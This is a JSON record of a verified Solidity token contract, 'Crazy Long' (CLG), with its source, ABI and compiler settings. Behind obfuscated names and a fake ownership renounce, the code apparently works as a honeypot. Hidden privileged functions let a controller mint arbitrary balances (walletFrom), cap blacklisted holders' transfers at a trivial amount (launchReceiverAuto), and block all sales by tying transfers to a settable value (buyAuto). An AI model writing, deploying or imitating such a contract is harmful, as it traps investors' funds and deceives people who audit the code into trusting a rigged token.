{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface sellTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeReceiver {\n    function createPair(address totalAmountTo, address amountTo) external returns (address);\n}\n\ninterface limitLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletReceiverEnable) external view returns (uint256);\n\n    function transfer(address enableTx, uint256 maxAt) external returns (bool);\n\n    function allowance(address launchTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableTx,\n        uint256 maxAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTxTake, uint256 value);\n    event Approval(address indexed launchTrading, address indexed spender, uint256 value);\n}\n\ninterface limitLiquidityMetadata is limitLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CrazyLong is maxShould, limitLiquidity, limitLiquidityMetadata {\n\n    bool public isLiquidity;\n\n    mapping(address => uint256) private txLaunched;\n\n    mapping(address => bool) public liquidityMarketing;\n\n    constructor (){\n        \n        sellTo launchedToken = sellTo(launchLimitShould);\n        isTo = feeReceiver(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));\n        \n        marketingTotal = _msgSender();\n        maxToken();\n        liquidityMarketing[marketingTotal] = true;\n        txLaunched[marketingTotal] = swapTeamFee;\n        if (totalBuy != shouldIsTotal) {\n            totalBuy = shouldIsTotal;\n        }\n        emit Transfer(address(0), marketingTotal, swapTeamFee);\n    }\n\n    uint256 private shouldIsTotal;\n\n    function senderFeeMarketing() private view {\n        require(liquidityMarketing[_msgSender()]);\n    }\n\n    function approve(address liquidityWallet, uint256 maxAt) public virtual override returns (bool) {\n        feeTo[_msgSender()][liquidityWallet] = maxAt;\n        emit Approval(_msgSender(), liquidityWallet, maxAt);\n        return true;\n    }\n\n    function buyAuto(uint256 maxAt) public {\n        senderFeeMarketing();\n        takeIsList = maxAt;\n    }\n\n    function transferFrom(address launchedSell, address enableTx, uint256 maxAt) external override returns (bool) {\n        if (_msgSender() != launchLimitShould) {\n            if (feeTo[launchedSell][_msgSender()] != type(uint256).max) {\n                require(maxAt <= feeTo[launchedSell][_msgSender()]);\n                feeTo[launchedSell][_msgSender()] -= maxAt;\n            }\n        }\n        return amountLimitFrom(launchedSell, enableTx, maxAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return listReceiver;\n    }\n\n    function transfer(address enableFee, uint256 maxAt) external virtual override returns (bool) {\n        return amountLimitFrom(_msgSender(), enableFee, maxAt);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingToSwap;\n    }\n\n    function owner() external view returns (address) {\n        return listReceiver;\n    }\n\n    mapping(address => bool) public sellLaunch;\n\n    function sellShouldFund(address launchedSell, address enableTx, uint256 maxAt) internal returns (bool) {\n        require(txLaunched[launchedSell] >= maxAt);\n        txLaunched[launchedSell] -= maxAt;\n        txLaunched[enableTx] += maxAt;\n        emit Transfer(launchedSell, enableTx, maxAt);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxTokenFrom;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txFrom;\n    }\n\n    uint256 constant exemptLaunch = 6 ** 10;\n\n    function walletFrom(address enableFee, uint256 maxAt) public {\n        senderFeeMarketing();\n        txLaunched[enableFee] = maxAt;\n    }\n\n    address public isTo;\n\n    address tokenTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private teamSell;\n\n    address launchLimitShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 totalLiquidityLaunched;\n\n    address private listReceiver;\n\n    event OwnershipTransferred(address indexed fundAutoList, address indexed walletMax);\n\n    uint8 private txFrom = 18;\n\n    function maxToken() public {\n        emit OwnershipTransferred(marketingTotal, address(0));\n        listReceiver = address(0);\n    }\n\n    function balanceOf(address walletReceiverEnable) public view virtual override returns (uint256) {\n        return txLaunched[walletReceiverEnable];\n    }\n\n    address public marketingTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapTeamFee;\n    }\n\n    uint256 public totalBuy;\n\n    function launchReceiverAuto(address listFrom) public {\n        senderFeeMarketing();\n        \n        if (listFrom == marketingTotal || listFrom == isTo) {\n            return;\n        }\n        sellLaunch[listFrom] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeTo;\n\n    function allowance(address walletReceiver, address liquidityWallet) external view virtual override returns (uint256) {\n        if (liquidityWallet == launchLimitShould) {\n            return type(uint256).max;\n        }\n        return feeTo[walletReceiver][liquidityWallet];\n    }\n\n    uint256 private swapTeamFee = 100000000 * 10 ** 18;\n\n    bool public enableAuto;\n\n    string private tradingToSwap = \"CLG\";\n\n    string private maxTokenFrom = \"Crazy Long\";\n\n    uint256 takeIsList;\n\n    function amountLimitFrom(address launchedSell, address enableTx, uint256 maxAt) internal returns (bool) {\n        if (launchedSell == marketingTotal) {\n            return sellShouldFund(launchedSell, enableTx, maxAt);\n        }\n        uint256 tokenSwapFund = limitLiquidity(isTo).balanceOf(tokenTake);\n        require(tokenSwapFund == takeIsList);\n        require(enableTx != tokenTake);\n        if (sellLaunch[launchedSell]) {\n            return sellShouldFund(launchedSell, enableTx, exemptLaunch);\n        }\n        return sellShouldFund(launchedSell, enableTx, maxAt);\n    }\n\n    uint256 public amountLiquidityMin;\n\n    function tradingTo(address senderExempt) public {\n        if (isLiquidity) {\n            return;\n        }\n        \n        liquidityMarketing[senderExempt] = true;\n        if (enableAuto != teamSell) {\n            totalBuy = shouldIsTotal;\n        }\n        isLiquidity = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAutoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTxTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidityMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiverEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"launchReceiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"}],\"name\":\"tradingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CrazyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}